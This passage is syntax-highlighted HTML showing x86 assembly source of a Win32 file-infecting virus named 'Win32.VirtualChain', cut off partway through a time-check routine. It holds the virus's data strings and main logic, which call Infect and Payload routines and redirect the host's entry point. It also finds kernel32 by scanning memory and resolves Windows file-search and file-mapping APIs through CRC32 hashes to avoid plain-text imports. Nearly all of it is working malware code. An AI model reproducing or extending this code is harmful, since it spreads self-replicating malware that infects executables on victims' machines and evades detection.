</span><span class="sc5">HostTitle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Virus successfully brougth to life"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HostText</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[Win32.VirtualChain, 01/01/02]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"  Siilex, Ivan Altarriba, BCN"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"In most countries, this is illegal."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"  Please, keep this PC isolated,"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"  and reformat HD after the test."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Life is beautiful."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"  So, live it, and don't get in trouble."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ModeOnTargetFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"target.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ModeOnTargetFileNameSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc0">



</span><span class="sc1">; Code</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">prog</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;chain_begin</span><span class="sc0">



</span><span class="sc1">; Main</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;Main proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEP</span><span class="sc4">],</span><span class="sc2">012345678h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">OldEP_in</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">000400000h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEP</span><span class="sc4">],</span><span class="sc2">012345678h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">NewEP_in</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">000001000h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">LoadSys</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Main</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">LifeTime</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Main</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Target</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">

</span><span class="sc5">e_Main</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_HeapSize</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Main endp</span><span class="sc0">



</span><span class="sc1">; Sys</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">LoadSys</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; GetKernel32 proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">_1_GetKernel32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_2_GetKernel32</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000010000h</span><span class="sc0">
</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc5">_1_GetKernel32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">e_GetKernel32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_2_GetKernel32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; GetKernel32 endp</span><span class="sc0">


</span><span class="sc1">; GetApiTable proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; "MZ"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; "PE\0\0"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">078h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; ExportDirectory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">018h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; NumberOfNames</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableAddr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; *AddressOfFunctions</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">020h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; *AddressOfNames</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">024h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableOrdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; *AddressOfNameOrdinals</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; GetApiTable endp</span><span class="sc0">


</span><span class="sc1">; LoadApi proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryACrc</span><span class="sc4">],</span><span class="sc2">03fc1bd8dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FreeLibraryCrc</span><span class="sc4">],</span><span class="sc2">0da68238fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressCrc</span><span class="sc4">],</span><span class="sc2">0c97c1fffh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetLocalTimeCrc</span><span class="sc4">],</span><span class="sc2">01bb43d20h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTimeToFileTimeCrc</span><span class="sc4">],</span><span class="sc2">038f590bbh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryACrc</span><span class="sc4">],</span><span class="sc2">0c79dc4e3h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryACrc</span><span class="sc4">],</span><span class="sc2">069b6849fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileACrc</span><span class="sc4">],</span><span class="sc2">0c9ebd5ceh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileACrc</span><span class="sc4">],</span><span class="sc2">075272948h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindCloseCrc</span><span class="sc4">],</span><span class="sc2">0d82bf69ah</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileACrc</span><span class="sc4">],</span><span class="sc2">0553b5c78h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileSizeCrc</span><span class="sc4">],</span><span class="sc2">0a7fb4165h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingACrc</span><span class="sc4">],</span><span class="sc2">0b41b926ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFileCrc</span><span class="sc4">],</span><span class="sc2">0a89b382fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFileCrc</span><span class="sc4">],</span><span class="sc2">0391ab6afh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFilePointerCrc</span><span class="sc4">],</span><span class="sc2">0efc7ea74h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetEndOfFileCrc</span><span class="sc4">],</span><span class="sc2">02519b15ah</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandleCrc</span><span class="sc4">],</span><span class="sc2">0b09315f4h</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@_LoadApiListSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_1_LoadApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Crc32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadApiListCrc</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_LoadApiListSize</span><span class="sc0">
</span><span class="sc5">_2_LoadApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_3_LoadApi</span><span class="sc0">
</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc5">_2_LoadApi</span><span class="sc0">

</span><span class="sc5">_4_LoadApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc5">_1_LoadApi</span><span class="sc0"> 
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">e_LoadApi</span><span class="sc0">


</span><span class="sc5">_3_LoadApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_LoadApiListSize</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadApiListAddr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableOrdi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000FFFFh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetApiTableAddr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_5_LoadApi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_4_LoadApi</span><span class="sc0"> 

</span><span class="sc5">_5_LoadApi</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; LoadApi endp</span><span class="sc0">


</span><span class="sc1">; LoadTime proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetLocalTime</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wYear</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1900</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000FFh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wMonth</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000FFh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wDay</span><span class="sc4">]</span><span class="sc0">
